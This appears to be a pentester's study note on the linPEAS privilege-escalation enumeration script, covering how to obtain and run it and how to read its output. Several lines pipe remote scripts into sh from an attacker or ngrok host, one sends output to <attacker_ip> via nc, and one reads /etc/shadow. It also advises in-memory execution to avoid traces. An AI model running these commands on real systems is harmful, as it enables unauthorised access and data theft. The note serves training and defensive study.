# O.R. 4.2 - Tools analysis: linPEAS

## Overview

- **linPEAS** (Linux Privilege Escalation Awesome Script) – a script that searches for possible paths to escalate privileges on Linux/Unix/macOS hosts.
- Developed by Carlos Polop (also author of HackTricks).
- Automates enumeration of misconfigurations, vulnerable software, SUID/SGID files, cron jobs, and more.
- **Primary use:** Post-exploitation privilege escalation discovery.

> **⚠ Exam Warning:** Using linPEAS on exams like OSCP can result in failure unless using an approved version. Offensive Security has approved an updated version, but always verify current exam rules before using automated tools.

---

## Obtaining linPEAS

**Official Repository:** https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

### Method 1: Download Single Script File

```bash
# Create update.sh
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh
```

- Keeps only the script you need.
- Easy to update with a simple script.

### Method 2: Clone the Repository

```bash
mkdir linpeas
cd linpeas
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git .
```

- Clones all scripts (linPEAS, winPEAS, etc.).
- Update with `git pull`.

### Method 3: In-Memory Execution (No Disk Write)

```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

- Useful when you don't want to leave traces on the target.

---

## Usage Examples

### Local Execution (on target machine)

```bash
# Switch to regular user (attacker's perspective)
su ckent
sudo -l
# Output: Sorry, user ckent may not run sudo on kali.

# Run linPEAS as the limited user
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

> **Important:** Run linPEAS as a **regular user** – that's how an attacker would use it.

### Internal Network (Python HTTP Server)

```bash
# Host (attacker machine)
mkdir pywww
cd pywww
cp /opt/linpeas/linpeas.sh .
python3 -m http.server 80

# Target
curl http://<attacker_ip>/linpeas.sh | sh
```

### Public Network (via ngrok)

```bash
# Host
/opt/ngrok http 80
# Generates: https://01513f63ed1d.ngrok.io

# Target
curl http://01513f63ed1d.ngrok.io/linpeas.sh | sh
```

### Redirect Output to Attacker Host (via Netcat)

```bash
# Host (attacker)
nc -lvnp 9002 | tee linpeas.out

# Target
curl http://<attacker_ip>/linpeas.sh | sh | nc <attacker_ip> 9002
```

---

## Detailed Output Analysis

linPEAS output is color-coded:
- **Green** = likely exploitable
- **Red** = potentially exploitable
- **Blue** = information
- **Cyan** = something found

### 1. System Information

**What it shows:**
- OS distribution, version, release
- Sudo version
- Virtualization detection

**Manual Alternatives:**
```bash
lsb_release -a
hostnamectl
sudo --version
```

### 2. Available Software

**What it shows:** Lists accessible software from predefined list:
```
nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 perl php ruby xterm doas sudo fetch ctr
```

**Manual Alternatives:**
```bash
ls /usr/bin
ls /usr/sbin
```

### 3. Processes, Cron, Services, Timers & Sockets

**What it shows:** Running processes – useful for finding vulnerable software running as root.

**Manual Alternative:**
```bash
ps -U root -u root u  # processes running as root
```

### 4. Network Information

**What it shows:**
- `/etc/hosts` entries (other domains/applications)
- Connected interfaces
- Open ports

**Manual Alternatives:**
```bash
cat /etc/hosts
ip addr
netstat -tulpn | grep LISTEN
```

### 5. User Information

**What it shows:**
- Current user info, group assignments, sudoer status
- Clipboard data (if xsel/xclip available)
- Users with console access
- Other shell accounts for horizontal privilege escalation

**Manual Alternatives:**
```bash
id
sudo -l
su <user>
cat /etc/passwd
```

### 6. Software Information

**What it shows:** Installed software – useful for finding vulnerable versions.

### 7. Interesting Files

**What it shows:**
- Popular attack vectors (password hashes, credentials)
- Writable files
- SUID/SGID binaries

**Manual Alternatives:**
```bash
cat /etc/shadow  # if readable
find / -perm -u+s -type f 2>/dev/null  # SUID binaries
find / -writable -type f 2>/dev/null  # writable files
```

---

## Quick Reference: Key Findings to Look For

| Category | What to Look For |
|----------|------------------|
| **SUID/SGID** | Exploitable binaries (e.g., `pkexec`, `sudo`, `find`, `vim`) |
| **Sudo Rights** | `sudo -l` shows commands you can run as root |
| **Writable Files** | World-writable files owned by root (cron jobs, scripts) |
| **Cron Jobs** | Scheduled tasks running as root with writable scripts |
| **Kernel Version** | Older kernels may have known exploits (Dirty Cow, etc.) |
| **Open Ports** | Services running that might be exploitable |
| **Passwords/Hashes** | Credentials in config files, `/etc/shadow` if readable |
| **PATH Misconfig** | Writable directories in PATH that can hijack commands |
| **LXC/LXD** | Container escape opportunities |

---

## Key Takeaways

- **linPEAS** is the most comprehensive Linux privesc enumeration tool – a must-have for pentesters.
- **Run it as a regular user** – that's how an attacker would use it.
- **Color-coded output** helps quickly identify high-priority findings.
- **Manual enumeration is still critical** – don't rely solely on automated tools; understand what linPEAS is showing you.
- **Exam caution:** Using linPEAS may violate exam rules (e.g., OSCP) – always verify current policies.
- **Alternatives:** LinEnum, Linux Smart Enumeration, Linux Exploit Suggester.
- **Combined approach:** Use linPEAS for initial findings, then manually validate and exploit.
- **Defender mindset:** Monitor for linPEAS execution (SIGINT, network connections, file creation) and treat it as an indicator of compromise.